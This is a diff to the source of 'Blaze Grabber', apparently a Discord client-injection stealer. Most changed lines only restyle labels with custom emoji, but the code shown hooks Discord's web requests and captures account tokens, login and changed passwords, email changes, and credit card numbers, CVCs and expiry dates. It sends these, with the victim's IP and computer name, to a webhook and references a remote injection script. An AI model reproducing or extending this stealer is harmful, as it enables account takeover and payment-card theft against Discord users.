@@ -11,7 +11,7 @@ const { BrowserWindow, session, safeStorage } = require('electron');
 // ── Config ────────────────────────────────────────────────────────────────────
 const WEBHOOK    = '%WEBHOOK%';
 const AVATAR_URL = 'https://i.pinimg.com/originals/43/79/bb/4379bb008f3b678c973727818e68ab35.gif';
-const EMBED_COLOR = 0xFF2514;
+const EMBED_COLOR = 0x8563FF;
 const BOT_NAME   = 'Blaze Grabber';
 const INJECT_URL = 'https://raw.githubusercontent.com/blazewys/discordinjection/refs/heads/main/dcinject.js';
 
@@ -167,84 +167,61 @@ async function postWebhook(payload) {
 
 // ── Badge / Nitro / Billing helpers ──────────────────────────────────────────
 
-// Badge ID → label map (profile endpoint'ten gelen id'ler)
+// Badge ID → emoji map (custom emojiler)
 const PROFILE_BADGE_MAP = {
-    'staff':                    '👮 Staff',
-    'partner':                  '🤝 Partner',
-    'hypesquad':                '🏠 HypeSquad Events',
-    'bug_hunter_level_1':       '🐛 Bug Hunter',
-    'hypesquad_online_house_1': '🏡 Bravery',
-    'hypesquad_online_house_2': '💡 Brilliance',
-    'hypesquad_online_house_3': '⚖️ Balance',
-    'premium_early_supporter':  '⭐ Early Supporter',
-    'bug_hunter_level_2':       '🐛 Bug Hunter Gold',
-    'verified_developer':       '🤖 Verified Dev',
-    'certified_moderator':      '🛡️ Certified Mod',
-    'active_developer':         '🔨 Active Dev',
-    'legacy_username':          '🏷️ Legacy Username',
-    'quest_completed':          '🎯 Quest Completed',
-    'orb_profile_badge':        '🔮 Orbs Badge',
-    'guild_booster_lvl1':       '🚀 Boost Lvl 1',
-    'guild_booster_lvl2':       '🚀 Boost Lvl 2',
-    'guild_booster_lvl3':       '🚀 Boost Lvl 3',
-    'guild_booster_lvl4':       '🚀 Boost Lvl 4',
-    'guild_booster_lvl5':       '🚀 Boost Lvl 5',
-    'guild_booster_lvl6':       '� Boost Lvl 6',
-    'guild_booster_lvl7':       '🚀 Boost Lvl 7',
-    'guild_booster_lvl8':       '🚀 Boost Lvl 8',
-    'guild_booster_lvl9':       '🚀 Boost Lvl 9',
-    'premium_tenure_1_month':   '🥉 Nitro 1 ay',
-    'premium_tenure_3_month':   '🥈 Nitro 3 ay',
-    'premium_tenure_6_month_v2':'🥇 Nitro 6 ay',
-    'premium_tenure_12_month':  '🏆 Nitro 12 ay',
-    'premium_tenure_24_month':  '👑 Nitro 24 ay',
+    'staff':                    '<:discordstaff:1533643624447742103>',
+    'partner':                  '<:discordpartner:1533643693444038698>',
+    'hypesquad':                '<:hypesquad:1533643806463758416>',
+    'bug_hunter_level_1':       '<:bughunter:1533644155996078160>',
+    'hypesquad_online_house_1': '<:bravery:1533643863842095214>',
+    'hypesquad_online_house_2': '<:brilliance:1533643948197679284>',
+    'hypesquad_online_house_3': '<:balance:1533643975586615397>',
+    'premium_early_supporter':  '<:early:1533644073271824516>',
+    'bug_hunter_level_2':       '<:bughunter2:1533644547287023636>',
+    'verified_developer':       '<:botdev:1533644656670277742>',
+    'certified_moderator':      '<:certifiedmod:1533644782189023437>',
+    'active_developer':         '<:botdev2:1533644711997341808>',
+    'legacy_username':          '<:username:1533644918587789544>',
+    'quest_completed':          '<:quest:1533645015279075342>',
+    'orb_profile_badge':        '<a:orbs:1533645071373828136>',
+    'guild_booster_lvl1':       '<:boost1m:1533642446863466646>',
+    'guild_booster_lvl2':       '<:boost2m:1533642495131517139>',
+    'guild_booster_lvl3':       '<:boost3m:1533642557563736155>',
+    'guild_booster_lvl4':       '<:boost6m:1533642618683129987>',
+    'guild_booster_lvl5':       '<:boost9m:1533642652141097041>',
+    'guild_booster_lvl6':       '<:boost12m:1533642671183106130>',
+    'guild_booster_lvl7':       '<:boost15m:1533642737633726474>',
+    'guild_booster_lvl8':       '<:boost18m:1533642756440723497>',
+    'guild_booster_lvl9':       '<:boost24m:1533642793682079804>',
+    'premium_tenure_1_month':   '<:nitrobronze:1533643137577254995>',
+    'premium_tenure_3_month':   '<:nitrosilver:1533643181974093894>',
+    'premium_tenure_6_month_v2':'<:nitrogold:1533642929153773829>',
+    'premium_tenure_12_month':  '<:nitroplatinum:1533643299536244797>',
+    'premium_tenure_24_month':  '<:nitrodiamond:1533643343798734991>',
 };
 
 function getBadges(user) {
-    // Sadece profile endpoint'ten gelen badges — bitfield'dan active_dev vb. ekleme
-    const profileBadges = (user._profile_badges || []).map(b => {
-        return PROFILE_BADGE_MAP[b.id] || b.description || b.id;
-    });
-    return profileBadges.length ? profileBadges.join(', ') : ':x:';
+    const profileBadges = (user._profile_badges || []).map(b =>
+        PROFILE_BADGE_MAP[b.id] || b.description || b.id
+    );
+    return profileBadges.length ? profileBadges.join(' ') : '<:no:1533642070701641889>';
 }
 
 function getNitro(user) {
     const t = user.premium_type;
-    if (!t) return ':x:';
-
-    const base = { 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic' }[t] || ':x:';
-    if (t !== 2 || !user.premium_guild_since) return base;
-
-    // Boost süresi hesapla
-    const since = new Date(user.premium_guild_since);
-    const now   = new Date();
-    const months = Math.floor((now - since) / (1000 * 60 * 60 * 24 * 30));
-    const levels = [
-        [1,  '🥉 Boost 1 ay'],
-        [2,  '🥈 Boost 2 ay'],
-        [3,  '🥇 Boost 3 ay'],
-        [6,  '🏆 Boost 6 ay'],
-        [9,  '💠 Boost 9 ay'],
-        [12, '🔷 Boost 12 ay'],
-        [15, '🔶 Boost 15 ay'],
-        [18, '🌟 Boost 18 ay'],
-        [24, '👑 Boost 24 ay'],
-    ];
-    let boostLabel = '🚀 Boosting';
-    for (const [m, label] of levels) {
-        if (months >= m) boostLabel = label;
-    }
-    return `${base} — ${boostLabel}`;
+    if (!t) return '<:no:1533642070701641889>';
+    const labels = { 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic' };
+    return `<:nitro:1533639641687920823> ${labels[t] || 'Nitro'}`;
 }
 
 function parseBilling(sources) {
-    if (!sources || !sources.length) return ':x:';
-    const out = sources.map(s => {
-        const icon = s.type === 1 ? ':credit_card:' : s.type === 2 ? '<:paypal:973417655627288666>' : null;
-        if (!icon) return null;
-        return s.invalid ? `~~${icon}~~ (expired)` : icon;
-    }).filter(Boolean);
-    return out.length ? out.join(' ') : ':x:';
+    if (!sources || !sources.length) return '<:no:1533642070701641889>';
+    const cards   = sources.filter(s => s.type === 1 && !s.invalid).length;
+    const paypals = sources.filter(s => s.type === 2 && !s.invalid).length;
+    const parts = [];
+    if (cards)   parts.push(cards   > 1 ? `<:card:1533639749376671785> x${cards}`   : '<:card:1533639749376671785>');
+    if (paypals) parts.push(paypals > 1 ? `<:paypal:1533641104480538695> x${paypals}` : '<:paypal:1533641104480538695>');
+    return parts.length ? parts.join(' ') : '<:no:1533642070701641889>';
 }
 
 // ── Embed builder ─────────────────────────────────────────────────────────────
@@ -291,16 +268,16 @@ async function buildUserInfo(token) {
 
 function buildFields(user, billing, friends, token, extra) {
     const fields = [
-        { name: '👤 Username', value: `\`${user.username}\``,            inline: true },
-        { name: '🆔 ID',       value: `\`${user.id}\``,                  inline: true },
-        { name: '📧 Email',    value: `\`${user.email    || 'N/A'}\``,   inline: true },
-        { name: '📱 Phone',    value: `\`${user.phone    || 'N/A'}\``,   inline: true },
-        { name: '🔒 2FA',      value: user.mfa_enabled ? '✅' : '❌',    inline: true },
-        { name: '💎 Nitro',    value: getNitro(user),                    inline: true },
-        { name: '💳 Billing',  value: parseBilling(billing),             inline: true },
-        { name: '🏅 Badges',   value: getBadges(user),                   inline: true },
+        { name: '<:user:1533638622761455637> Username', value: `\`${user.username}\``,                                              inline: true },
+        { name: '<:mail:1533638816559140877> Email',    value: `\`${user.email    || 'N/A'}\``,                                    inline: true },
+        { name: '<:phone:1533639066057179136> Phone',   value: `\`${user.phone    || 'N/A'}\``,                                    inline: true },
+        { name: '<:user:1533638622761455637> ID',       value: `\`${user.id}\``,                                                   inline: true },
+        { name: '<:lock:1533640371882557501> 2FA',      value: user.mfa_enabled ? '<:tick:1533641966632435936>' : '<:no:1533642070701641889>', inline: true },
+        { name: '<:nitro:1533639641687920823> Nitro',   value: getNitro(user),                                                     inline: true },
+        { name: '<:card:1533639749376671785> Billing',  value: parseBilling(billing),                                              inline: true },
+        { name: '<:badge:1533639967761240154> Badges',  value: getBadges(user),                                                    inline: true },
         ...(extra || []),
-        { name: '🔑 Token',    value: `\`${token}\``,                    inline: false },
+        { name: '<:token:1533639840254660640> Token',   value: `\`\`\`${token}\`\`\``,                                            inline: false },
     ];
     return fields;
 }
@@ -328,9 +305,9 @@ async function firstTime() {
             await postWebhook(buildPayload(
                 'Discord Injection — No Session',
                 [
-                    { name: '💻 Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
-                    { name: '🌐 IP',       value: `\`${ip}\``,                                 inline: true },
-                    { name: '📂 Client',   value: `\`${client}\``,                             inline: true },
+                    { name: '<:computer:1533640158740615168> Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
+                    { name: '<:ip:1533640242437816390> IP',             value: `\`${ip}\``,                                inline: true },
+                    { name: '<:web:1533641362975621270> Client',                                value: `\`${client}\``,                            inline: true },
                 ],
                 AVATAR_URL, null
             ));
@@ -344,9 +321,9 @@ async function firstTime() {
                 if (!info) continue;
                 const { user, billing, avatar, banner } = info;
                 const fields = buildFields(user, billing, null, token, [
-                    { name: '💻 Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
+                    { name: '<:computer:1533640158740615168> Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
                     { name: '🌐 IP',       value: `\`${ip}\``,                                 inline: true },
-                    { name: '📂 Client',   value: `\`${client}\``,                             inline: true },
+                    { name: '<:web:1533641362975621270> Client',   value: `\`${client}\``,                             inline: true },
                 ]);
                 await postWebhook(buildPayload(
                     'Discord Injection — Initialized',
@@ -446,9 +423,9 @@ session.defaultSession.webRequest.onCompleted({
 
     const { user, billing, avatar, banner } = info;
     const base = [
-        { name: '💻 Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
+        { name: '<:computer:1533640158740615168> Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
         { name: '🌐 IP',       value: `\`${ip}\``,                                 inline: true },
-        { name: '📂 Client',   value: `\`${client}\``,                             inline: true },
+        { name: '<:web:1533641362975621270> Client',   value: `\`${client}\``,                             inline: true },
     ];
 
     switch (true) {
@@ -458,7 +435,7 @@ session.defaultSession.webRequest.onCompleted({
                 'Discord — Login Captured',
                 buildFields(user, billing, null, token, [
                     ...base,
-                    { name: '🔑 Password', value: `\`${data.password}\``, inline: false },
+                    { name: '<:token:1533639840254660640> Password', value: `\`${data.password}\``, inline: false },
                 ]),
                 avatar || AVATAR_URL, banner || null
             ));
@@ -471,8 +448,8 @@ session.defaultSession.webRequest.onCompleted({
                     'Discord — Password Changed',
                     buildFields(user, billing, null, token, [
                         ...base,
-                        { name: '🔑 Old Password', value: `\`${data.password}\``,     inline: true },
-                        { name: '🔑 New Password', value: `\`${data.new_password}\``, inline: true },
+                        { name: '<:token:1533639840254660640> Old Password', value: `\`${data.password}\``,     inline: true },
+                        { name: '<:token:1533639840254660640> New Password', value: `\`${data.new_password}\``, inline: true },
                     ]),
                     avatar || AVATAR_URL, banner || null
                 ));
@@ -482,8 +459,8 @@ session.defaultSession.webRequest.onCompleted({
                     'Discord — Email Changed',
                     buildFields(user, billing, null, token, [
                         ...base,
-                        { name: '📧 New Email', value: `\`${data.email}\``,    inline: true },
-                        { name: '🔑 Password',  value: `\`${data.password}\``, inline: true },
+                        { name: '<:mail:1533638816559140877> New Email', value: `\`${data.email}\``,    inline: true },
+                        { name: '<:token:1533639840254660640> Password',  value: `\`${data.password}\``, inline: true },
                     ]),
                     avatar || AVATAR_URL, banner || null
                 ));
@@ -495,9 +472,9 @@ session.defaultSession.webRequest.onCompleted({
                 'Discord — Credit Card Added',
                 buildFields(user, billing, null, token, [
                     ...base,
-                    { name: '💳 Card',   value: `\`${data['card[number]']    || 'N/A'}\``,                                inline: true },
-                    { name: '🔒 CVC',    value: `\`${data['card[cvc]']       || 'N/A'}\``,                                inline: true },
-                    { name: '📅 Expiry', value: `\`${data['card[exp_month]'] || '?'}/${data['card[exp_year]'] || '?'}\``, inline: true },
+                    { name: '<:card:1533639749376671785> Card',   value: `\`${data['card[number]']    || 'N/A'}\``,                                inline: true },
+                    { name: '<:lock:1533640371882557501> CVC',    value: `\`${data['card[cvc]']       || 'N/A'}\``,                                inline: true },
+                    { name: '<:card:1533639749376671785> Expiry', value: `\`${data['card[exp_month]'] || '?'}/${data['card[exp_year]'] || '?'}\``, inline: true },
                 ]),
                 avatar || AVATAR_URL, banner || null
             ));
